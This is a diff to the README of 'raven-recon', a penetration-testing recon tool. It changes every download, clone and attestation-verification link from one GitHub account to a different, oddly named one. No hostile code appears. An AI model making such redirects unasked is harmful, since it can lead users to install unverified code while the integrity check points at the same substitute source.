@@ -4,7 +4,7 @@
 hunters and penetration testers. Runs on **Windows** and **Kali Linux** as a desktop app,
 a local web UI, or in the terminal.
 
-[![tests](https://github.com/mahmodaltory12-beep/raven-recon/actions/workflows/tests.yml/badge.svg)](https://github.com/mahmodaltory12-beep/raven-recon/actions/workflows/tests.yml)
+[![tests](https://github.com/9illcodelli6-cpp69cve/raven-recon/actions/workflows/tests.yml/badge.svg)](https://github.com/9illcodelli6-cpp69cve/raven-recon/actions/workflows/tests.yml)
 [![licence: AGPL-3.0](https://img.shields.io/badge/licence-AGPL--3.0-blue.svg)](LICENSE)
 ![platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20Kali%20Linux-informational)
 
@@ -58,7 +58,7 @@ a local web UI, or in the terminal.
 
 **Option A — ready-to-run app (recommended):**
 1. Download `RAVEN-Recon-windows-x64.zip` from the
-   [Releases page](https://github.com/mahmodaltory12-beep/raven-recon/releases/latest).
+   [Releases page](https://github.com/9illcodelli6-cpp69cve/raven-recon/releases/latest).
 2. [Verify it](#verify-your-download), unzip it, and run `RAVEN.exe`.
    (Windows 10/11 with the Edge WebView2 runtime, which is built into Windows 11.)
 
@@ -66,7 +66,7 @@ a local web UI, or in the terminal.
 `winget install -e --id Python.Python.3.12` — and [Git](https://git-scm.com/)), in PowerShell:
 
 ```powershell
-git clone https://github.com/mahmodaltory12-beep/raven-recon.git
+git clone https://github.com/9illcodelli6-cpp69cve/raven-recon.git
 cd raven-recon
 powershell -ExecutionPolicy Bypass -File .\install.ps1
 ```
@@ -88,7 +88,7 @@ sudo apt install -y gir1.2-webkit2-4.1 bubblewrap   # own window + command sandb
 
 **Option B — from source (recommended on Kali):**
 ```bash
-git clone https://github.com/mahmodaltory12-beep/raven-recon.git
+git clone https://github.com/9illcodelli6-cpp69cve/raven-recon.git
 cd raven-recon
 ./install.sh
 ```
@@ -106,7 +106,7 @@ this repository's workflow:
 
 ```bash
 sha256sum -c SHA256SUMS.txt --ignore-missing
-gh attestation verify RAVEN-Recon-linux-x64.tar.gz --repo mahmodaltory12-beep/raven-recon
+gh attestation verify RAVEN-Recon-linux-x64.tar.gz --repo 9illcodelli6-cpp69cve/raven-recon
 ```
 Windows: `Get-FileHash .\RAVEN-Recon-windows-x64.zip -Algorithm SHA256` and compare with
 `SHA256SUMS.txt`. Copies from anywhere else ("PRO", "cracked", re-uploads) are not official
